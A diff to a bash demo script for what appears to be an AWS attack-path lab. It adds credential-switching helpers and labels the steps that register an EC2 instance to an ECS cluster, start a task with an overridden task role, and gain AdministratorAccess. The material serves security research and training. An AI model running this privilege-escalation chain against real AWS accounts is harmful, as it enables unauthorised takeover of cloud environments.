@@ -227,18 +227,39 @@ echo "Instance Role (starting principal): $INSTANCE_ROLE_ARN"
 echo "Region: $AWS_REGION"
 echo "ECS Cluster: $ECS_CLUSTER_NAME"
 echo "Target Role ARN: $TARGET_ROLE_ARN"
+
+# Extract readonly credentials for observation/polling steps
+READONLY_ACCESS_KEY=$(terraform output -raw prod_readonly_user_access_key_id 2>/dev/null)
+READONLY_SECRET_KEY=$(terraform output -raw prod_readonly_user_secret_access_key 2>/dev/null)
+
+if [ -z "$READONLY_ACCESS_KEY" ] || [ "$READONLY_ACCESS_KEY" == "null" ]; then
+    echo -e "${RED}Error: Could not find readonly credentials in terraform output${NC}"
+    exit 1
+fi
+
+echo "ReadOnly Key ID: ${READONLY_ACCESS_KEY:0:10}..."
 echo -e "${GREEN}✓ Retrieved configuration from Terraform${NC}\n"
 
 # Navigate back to scenario directory
 cd - > /dev/null
 
+# Credential switching helpers
+use_admin_creds() {
+    export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+use_readonly_creds() {
+    export AWS_ACCESS_KEY_ID="$READONLY_ACCESS_KEY"
+    export AWS_SECRET_ACCESS_KEY="$READONLY_SECRET_KEY"
+    unset AWS_SESSION_TOKEN
+}
+
 # Step 2: Set up SSM access (simulating RCE - NOT part of attack)
 echo -e "${YELLOW}Step 2: Setting up SSM access to EC2 (simulating RCE)${NC}"
 echo -e "${DIM}(In the real world, the attacker has shell access via an application vulnerability)${NC}"
-export AWS_ACCESS_KEY_ID="$ADMIN_ACCESS_KEY"
-export AWS_SECRET_ACCESS_KEY="$ADMIN_SECRET_KEY"
+use_admin_creds
 export AWS_REGION="$AWS_REGION"
-unset AWS_SESSION_TOKEN
 echo -e "${GREEN}✓ SSM access configured (RCE simulation)${NC}\n"
 
 # Step 2b: Verify SSM agent is online before sending commands
@@ -278,14 +299,15 @@ else
 fi
 echo ""
 
-# Step 5: Verify ECS cluster is EMPTY
+# [OBSERVATION] Step 5: Verify ECS cluster is EMPTY
 echo -e "${YELLOW}Step 5: Verifying ECS cluster is EMPTY (no container instances)${NC}"
 echo "Cluster: $ECS_CLUSTER_NAME"
 echo -e "${BLUE}The EC2 instance exists but its ECS agent points to a non-existent cluster.${NC}"
 echo -e "${BLUE}The attacker will call ecs:RegisterContainerInstance directly via the API.${NC}"
 
-# Check from the admin context (instance role doesn't have ListContainerInstances)
-show_cmd "Attacker" "aws ecs list-container-instances --cluster $ECS_CLUSTER_NAME"
+# Check using readonly creds (observation only)
+use_readonly_creds
+show_cmd "ReadOnly" "aws ecs list-container-instances --cluster $ECS_CLUSTER_NAME"
 CONTAINER_INSTANCES=$(aws ecs list-container-instances \
     --region "$AWS_REGION" \
     --cluster "$ECS_CLUSTER_NAME" \
@@ -301,7 +323,8 @@ else
 fi
 echo ""
 
-# Step 6: Register EC2 to the ECS cluster via direct API call
+# [EXPLOIT] Step 6: Register EC2 to the ECS cluster via direct API call
+use_admin_creds
 echo -e "${YELLOW}Step 6: Calling ecs:RegisterContainerInstance directly via API from EC2${NC}"
 echo -e "${BLUE}The attacker retrieves the instance identity document and signature from IMDS,${NC}"
 echo -e "${BLUE}then calls ecs:RegisterContainerInstance directly (not through the ECS agent).${NC}"
@@ -358,7 +381,7 @@ echo "Container Instance ARN: $CONTAINER_INSTANCE_ARN"
 echo -e "${GREEN}✓ Successfully registered EC2 to cluster via direct API call${NC}"
 echo ""
 
-# Step 7: Reconfigure ECS agent to connect to the cluster
+# [EXPLOIT] Step 7: Reconfigure ECS agent to connect to the cluster
 echo -e "${YELLOW}Step 7: Reconfiguring ECS agent to connect to the target cluster${NC}"
 echo -e "${BLUE}Now that the EC2 is registered via direct API call, the attacker reconfigures${NC}"
 echo -e "${BLUE}the ECS agent to connect to the cluster. The agent will update the container${NC}"
@@ -382,7 +405,8 @@ else
 fi
 echo ""
 
-# Step 8: Wait for ECS agent to connect and find the agent-connected container instance
+# [OBSERVATION] Step 8: Wait for ECS agent to connect and find the agent-connected container instance
+use_readonly_creds
 echo -e "${YELLOW}Step 8: Waiting for ECS agent to connect to cluster${NC}"
 echo -e "${BLUE}The agent creates its own registration with full capability attributes${NC}"
 echo -e "${BLUE}(Docker version, OS type, networking, etc.) needed for task placement.${NC}"
@@ -445,7 +469,8 @@ fi
 
 echo "Agent Container Instance ARN: $CONTAINER_INSTANCE_ARN"
 
-# Deregister the orphaned direct-API registration if it's different from the agent's
+# [EXPLOIT] Deregister the orphaned direct-API registration if it's different from the agent's
+use_admin_creds
 if [ "$DIRECT_API_CI_ARN" != "$CONTAINER_INSTANCE_ARN" ] && [ -n "$DIRECT_API_CI_ARN" ]; then
     echo "Deregistering orphaned direct-API container instance..."
     show_attack_cmd "Attacker" "aws ecs deregister-container-instance --cluster $ECS_CLUSTER_NAME --container-instance $DIRECT_API_CI_ARN"
@@ -454,7 +479,7 @@ if [ "$DIRECT_API_CI_ARN" != "$CONTAINER_INSTANCE_ARN" ] && [ -n "$DIRECT_API_CI
 fi
 echo ""
 
-# Step 9: Discover the pre-existing task definition
+# [EXPLOIT] Step 9: Discover the pre-existing task definition
 echo -e "${YELLOW}Step 9: Discovering existing task definitions${NC}"
 echo "Listing task definitions from EC2..."
 
@@ -474,7 +499,7 @@ echo -e "${BLUE}We exploit the existing task definition using ecs:StartTask --ov
 echo -e "${BLUE}to override both the command AND the taskRoleArn.${NC}"
 echo -e "${GREEN}✓ Identified existing task definition to exploit${NC}\n"
 
-# Step 10: Start ECS task with overrides to escalate privileges
+# [EXPLOIT] Step 10: Start ECS task with overrides to escalate privileges
 echo -e "${YELLOW}Step 10: Starting ECS task with command and role overrides from EC2${NC}"
 echo "Cluster: $ECS_CLUSTER_NAME"
 echo "Task Definition: $EXISTING_TASK_FAMILY"
@@ -532,9 +557,10 @@ fi
 echo "Task ARN: $TASK_ARN"
 echo -e "${GREEN}✓ Successfully started ECS task with overridden command and role!${NC}\n"
 
-# Step 11: Wait for task to complete
+# [OBSERVATION] Step 11: Wait for task to complete
+use_readonly_creds
 echo -e "${YELLOW}Step 11: Waiting for ECS task to complete${NC}"
-echo "Monitoring task status (from admin context)..."
+echo "Monitoring task status (using readonly creds)..."
 
 MAX_ATTEMPTS=30
 ATTEMPT=0
@@ -585,7 +611,8 @@ echo "IAM changes can take time to propagate across AWS infrastructure..."
 sleep 15
 echo -e "${GREEN}✓ IAM policy propagation complete${NC}\n"
 
-# Step 13: Verify admin access from the EC2
+# [OBSERVATION] Step 13: Verify admin access from the EC2
+use_admin_creds
 echo -e "${YELLOW}Step 13: Verifying administrator access from EC2${NC}"
 echo "Attempting to list IAM users from EC2 using instance role..."
 
@@ -600,9 +627,10 @@ else
     echo -e "${RED}Failed to list users from EC2${NC}"
     echo "$SSM_OUTPUT"
 
-    # Double check from admin context
+    # Double check using readonly creds (observation)
+    use_readonly_creds
     echo ""
-    echo "Checking policy attachment from admin context..."
+    echo "Checking policy attachment using readonly creds..."
     ATTACHED=$(aws iam list-attached-role-policies \
         --role-name "$INSTANCE_ROLE_NAME" \
         --query 'AttachedPolicies[?PolicyName==`AdministratorAccess`]' \
